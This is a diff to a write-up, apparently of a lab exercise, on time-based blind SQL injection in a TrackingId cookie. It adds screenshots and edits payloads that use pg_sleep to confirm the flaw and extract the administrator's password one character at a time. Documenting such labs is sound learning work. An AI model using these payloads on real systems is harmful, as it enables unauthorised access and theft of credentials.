@@ -28,12 +28,18 @@ Confirm SQL injection
 
 TrackingId=x'||pg_sleep(5)--
 
+<img width="1916" height="941" alt="1 2" src="https://github.com/user-attachments/assets/8e99f9bb-c4b9-4125-b4a3-d5666c81d9b5" />
+
 Extract password characters
 
-TrackingId=x'|| SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+TrackingId=x'|| SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+
+<img width="1900" height="907" alt="1" src="https://github.com/user-attachments/assets/fd686d93-d514-4f35-8cda-1aeeab01b8a0" />
 
 ## Result
 Successfully extracted the password of the administrator account using time-based blind SQL injection.
+
+<img width="1850" height="915" alt="Screenshot 2026-07-27 224604" src="https://github.com/user-attachments/assets/a8f64ed6-8408-4f3a-ac1f-68ca200efdc6" />
 
 ## Impact
 An attacker can extract sensitive data such as passwords from the database even when no error messages or output are displayed.
